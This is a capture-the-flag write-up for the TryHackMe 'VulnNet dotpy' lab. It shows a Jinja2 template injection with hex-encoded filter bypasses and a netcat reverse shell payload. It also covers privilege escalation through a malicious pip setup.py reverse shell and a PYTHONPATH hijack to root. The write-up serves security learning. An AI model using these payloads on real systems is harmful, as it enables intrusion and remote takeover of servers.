# 70 - VulnNet dotpy (SSTI / SSTI Bypass)

Room Link --> [https://tryhackme.com/room/vulnnetdotpy](https://tryhackme.com/room/vulnnetdotpy)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```
gobuster dir -u http://10.10.82.145:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 403

/login
/register
/logout
```
{% endcode %}

We registered a new user and login.

I noticed whenever i enter a non existent page it gets injected into the page.

### SSTI exploitation

[http://10.10.82.145:8080/robots](http://10.10.82.145:8080/robots.txt)

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And some characters are blackliisted.

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can start testing for SSTI (Server Side Template Injection) by going to [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#templates-injections) since we know the backend is using Python the guess here will be the Template in use here is Jinja2

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This worked:

```bash
{{7*'7'}} would result in 7777777

# go to:
http://10.10.82.145:8080/{{7*'7'}}
```

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

SSTI Resource --> [https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

But there are some blacklisted characters we need to find them. We can just cause the program to error out.

Since this is executing python code i just added "print" in the payload.

`http://10.10.82.145:8080/{{print(7*'7')}}`

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We confirmed the Template Language `jinja2.exceptions.UndefinedError` .

Then i clicked the 1st error:

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see the blacklisted characters.

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
# blacklisted characters.
. _ [ ]
```

### Bypassing Filters

We use this resource that uses [Python Literal Hex Encoding](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) for bypassing those filters.

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### payload used

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># we enter our hex encoded payload in the 'PAYLOAD' field.
</strong><strong>/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('PAYLOAD')|attr('read')()}}
</strong></code></pre>

We use cyberchef to hex encode our payload:

{% code overflow="wrap" %}
```bash
# payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9002 >/tmp/f

# hex encoded.
\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x31\x30\x2e\x31\x38\x2e\x38\x38\x2e\x32\x31\x34\x20\x39\x30\x30\x32\x20\x3e\x2f\x74\x6d\x70\x2f\x66
```
{% endcode %}

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

#### Final Payload

{% code overflow="wrap" %}
```bash
/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x31\x30\x2e\x31\x38\x2e\x38\x38\x2e\x32\x31\x34\x20\x39\x30\x30\x32\x20\x3e\x2f\x74\x6d\x70\x2f\x66')|attr('read')()}}
```
{% endcode %}

Setup NC listener, then we copy this payload and use Bursuite repeater to send this request.

<figure><img src=".gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And i got shell on NC listener:

<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to system-adm user

`sudo -l` and we can execute `/usr/bin/pip3 install *` as system-adm

So we check gtfobin for exploitation:

{% code overflow="wrap" lineNumbers="true" %}
```bash
# make a dir/
mkdir dking && cd dking

# create a .py file that executes a rev shell.
echo 'import os,pty,socket;s=socket.socket();s.connect(("10.18.88.214",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' >  setup.py

# setup nc listener
nc -nvlp 7777

# execute it.
sudo -u system-adm /usr/bin/pip3 install .
```
{% endcode %}

We got shell.

<figure><img src=".gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to root

`sudo -l` and we can execute `/usr/bin/python3 /opt/backup.py` as root.

```bash
User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

```bash
# content of the file.
system-adm@vulnnet-dotpy:/opt$ cat backup.py 
from datetime import datetime
from pathlib import Path
import zipfile
```

We can see the file is calling the `zipfile` library and since we have `SETENV` priv we can set a fake PATHONPATH env variable with a malicious .py file.

```bash
# the malicious library.
echo 'import pty; pty.spawn("/bin/bash")' > /tmp/zipfile.py

# executing it.
sudo -u root PYTHONPATH=/tmp /usr/bin/python3 /opt/backup.py
```

And we got root.

<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Done!

